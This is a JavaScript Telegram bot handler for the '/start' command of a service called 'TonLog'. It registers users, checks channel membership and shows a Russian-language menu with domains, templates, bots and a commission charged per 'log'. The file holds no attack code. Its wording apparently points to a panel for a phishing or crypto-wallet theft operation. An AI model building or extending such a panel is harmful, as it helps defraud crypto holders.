import { bot } from "../../index.js";
import config from '../../../../config.json' assert { type: 'json' };
import Database from "../../../database/index.js";
import User from "../../../database/schemas/user.js";
import commission from "../../../database/schemas/commission.js";
import checker from "../../../checker/index.js";

export default {
    name: "/start",
    async exec(message) {
        const user = await Database.getUser(message.from.id);
        console.log(user)
        if (!user) {
            await Database.createUser(message.from.id, !isNaN(+message.text.split(" ")[1]) ? message.text.split(" ")[1] : null, message.from.username ? `@${message.from.username}` : message.from.first_name);
        }

        if (!user?.member) {
            const { status } = await bot.getChatMember(isNaN(+config.channel) ? (await bot.getChat(`@${config.channel}`)).id : config.channel, message.from.id)
                .catch(() => ({ status: 'error' }));

            if (status === 'left') {
                await bot.deleteMessage(message.chat.id, message.message_id);
                const msg = await bot.sendPhoto(message.from.id, 'cdn/hi.png', {
                    caption: `👋🏻 <b>Привет! Добро пожаловать в TonLog!</b>

<b>💎 Для работы с панелью вступи в наш чат! 👇🏻</b>`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: "➕ Вступить",
                                    url: config.channel_url
                                }
                            ]
                        ]
                    }
                });
                return checker(message.from.id, msg.message_id);
            } else await User.updateOne({ id: message.from.id }, { $set: { member: true } });
        }

        await bot.sendMessage(message.from.id, `💎 Вам было выведено меню`, {
            reply_markup: {
                resize_keyboard: true,
                keyboard: [
                    [
                        {
                            text: '🏠 Меню'
                        }
                    ]
                ]
            }
        })

        await bot.sendPhoto(message.from.id, 'cdn/menu.png', {
            caption: `*⚡️ Добро пожаловать в TonLog!*

*🧾 Комиссия:* \`Каждый ${user?.com || (await commission.findOne({})).value} лог\``,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '💻 Профиль',
                            callback_data: 'profile'
                        },
                        {
                            text: '⚙️ Настройки',
                            callback_data: 'lzt'
                        }
                    ],
                    [
                        {
                            text: "🤖 Боты",
                            callback_data: 'bots'
                        },
                        {
                            text: '🌐 Домены',
                            callback_data: `domains`
                        }
                    ],
                    [
                        {
                            text: '📂 Шаблоны',
                            callback_data: 'templates'
                        }
                    ],
                    [
                        {
                            text: '🏆 Топ Проекта',
                            callback_data: 'top:all'
                        },
                        {
                            text: '📃 Информация',
                            callback_data: 'info'
                        }
                    ]
                ]
            }
        })
    }
}